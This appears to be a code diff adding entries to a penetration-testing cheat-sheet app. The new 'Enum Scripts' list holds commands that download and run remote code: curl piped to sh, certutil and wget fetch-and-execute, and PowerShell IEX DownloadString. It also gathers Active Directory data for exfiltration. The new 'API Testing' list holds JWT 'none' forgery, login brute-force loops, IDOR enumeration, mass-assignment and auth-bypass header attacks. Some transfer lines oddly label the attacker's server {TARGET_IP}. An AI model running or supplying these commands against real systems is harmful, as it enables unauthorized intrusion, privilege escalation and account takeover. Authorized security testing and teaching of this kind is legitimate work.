@@ -55,6 +55,25 @@ const ONELINERS = [
     { name: 'Unquoted service paths', cmd: 'wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\\windows"' },
     { name: 'AlwaysInstallElevated', cmd: 'reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated' },
   ]},
+  { cat: 'Enum Scripts', items: [
+    { name: 'LinPEAS (download + run)', cmd: 'curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh' },
+    { name: 'LinPEAS (transfer + run)', cmd: '# On attacker: python3 -m http.server 80\nwget http://{TARGET_IP}/linpeas.sh -O /tmp/lp.sh && chmod +x /tmp/lp.sh && /tmp/lp.sh | tee /tmp/lp.out' },
+    { name: 'WinPEAS', cmd: 'certutil -urlcache -split -f http://{TARGET_IP}/winPEASx64.exe C:\\Temp\\wp.exe && C:\\Temp\\wp.exe' },
+    { name: 'pspy (process spy)', cmd: '# Detects cron/scheduled tasks without root\nwget http://{TARGET_IP}/pspy64 -O /tmp/pspy && chmod +x /tmp/pspy && /tmp/pspy' },
+    { name: 'adPEAS (AD enum)', cmd: 'IEX(New-Object Net.WebClient).DownloadString("http://{TARGET_IP}/adPEAS.ps1")\nInvoke-adPEAS' },
+    { name: 'SharpHound (BloodHound)', cmd: '.\\SharpHound.exe -c all --zipfilename bh.zip\n# Transfer bh.zip back to attacker for BloodHound import' },
+    { name: 'Seatbelt (Windows audit)', cmd: '.\\Seatbelt.exe -group=all -full' },
+  ]},
+  { cat: 'API Testing', items: [
+    { name: 'Find API endpoints', cmd: 'ffuf -u http://{TARGET_IP}/api/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt -mc 200,201,301,403' },
+    { name: 'GraphQL introspection', cmd: 'curl -s http://{TARGET_IP}/graphql -H "Content-Type: application/json" -d \'{"query":"{__schema{types{name,fields{name}}}}"}\''},
+    { name: 'JWT decode (no verify)', cmd: 'echo "<TOKEN>" | cut -d. -f2 | base64 -d 2>/dev/null | python3 -m json.tool' },
+    { name: 'JWT none algorithm', cmd: '# Change alg to "none", remove signature\n# Header: {"alg":"none","typ":"JWT"}\n# Payload: modify claims\n# Token: base64(header).base64(payload).' },
+    { name: 'Mass assignment test', cmd: 'curl -X PUT http://{TARGET_IP}/api/user/profile -H "Content-Type: application/json" -d \'{"name":"test","role":"admin","is_admin":true}\'' },
+    { name: 'Rate limit bypass', cmd: '# Try: X-Forwarded-For: 127.0.0.1\n# Try: X-Original-URL header\n# Try: adding null bytes, case changes to endpoint\nfor i in $(seq 1 100); do curl -s -o /dev/null -w "%{http_code}" http://{TARGET_IP}/api/login -d "user=admin&pass=test$i"; done' },
+    { name: 'IDOR test', cmd: '# Replace ID in URL/body with other user IDs\nfor id in $(seq 1 100); do curl -s http://{TARGET_IP}/api/user/$id -H "Authorization: Bearer <TOKEN>" | grep -v "403"; done' },
+    { name: 'Auth bypass headers', cmd: 'curl http://{TARGET_IP}/admin -H "X-Original-URL: /admin" -H "X-Forwarded-For: 127.0.0.1" -H "X-Custom-IP-Authorization: 127.0.0.1"' },
+  ]},
 ]
 
 function CopyBtn({ text }) {
